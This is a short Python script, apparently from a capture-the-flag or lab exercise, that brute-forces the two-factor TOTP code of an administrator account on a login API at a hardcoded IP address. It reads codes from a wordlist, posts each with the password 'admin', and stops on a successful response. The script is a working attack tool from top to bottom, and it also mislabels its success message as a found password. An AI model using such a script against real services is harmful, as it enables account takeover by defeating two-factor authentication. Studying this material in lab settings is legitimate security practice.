# /usr/share/wordlists/rockyou.txt

import requests
import sys
import json

url = "http://138.195.248.4:5000/api/login"


def brute():
    with open("/home/kali-user/Documents/tracs3/digits_reversed.txt", "r") as f:
        c = 0
        for line in f:
            c += 1
            totp = line.strip()
            if c % 500 == 0:
                print("[*] Trying: " + totp)

            password = "admin"
            headers = {"Content-Type": "application/json"}
            data = {"email": "admin@trade.local", "password": password, "totp": totp}
            data_json = json.dumps(data)

            r = requests.post(url, data=data_json, headers=headers, verify=False)
            if r.status_code == 200:
                print("[+] Password found: " + password)
                sys.exit()


if __name__ == "__main__":
    brute()
